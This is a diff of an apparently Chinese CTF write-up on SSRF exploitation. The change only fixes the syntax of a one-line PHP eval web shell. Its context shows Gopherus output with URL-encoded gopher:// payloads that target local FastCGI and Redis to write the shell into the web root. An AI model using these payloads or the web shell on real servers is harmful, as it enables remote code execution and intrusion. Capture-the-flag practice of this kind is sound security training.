@@ -3616,7 +3616,7 @@ gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%
 与上一道题不同的是，这一道题我们需要用到的命令行是：
 
 ```php
-<?php @eval($_POST['t0ur1st']) ?>
+<?php @eval($_POST['t0ur1st']);?>
 ```
 
 在`Kali`系统中输入以下命令启动`Gopherus`，以准备好利用SSRF漏洞的`payload`。
@@ -3638,7 +3638,7 @@ Ready To get SHELL
 What do you want?? (ReverseShell/PHPShell): PHPShell
 
 Give web root location of server (default is /var/www/html):
-Give PHP Payload (We have default PHP Shell): <?php @eval($_POST['t0ur1st']) ?>
+Give PHP Payload (We have default PHP Shell): <?php @eval($_POST['t0ur1st']);?>
 
 Your gopher link is Ready to get PHP Shell:                                       
 
@@ -3674,7 +3674,7 @@ gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%
 REDIS0007�	redis-ver3.2.6�
 redis-bits�@�ctime�	�_i�used-mem�����%
 
-<?php @eval($_POST['t0ur1st']) ?>
+<?php @eval($_POST['t0ur1st']);?>
 
 ���p[���
 ```
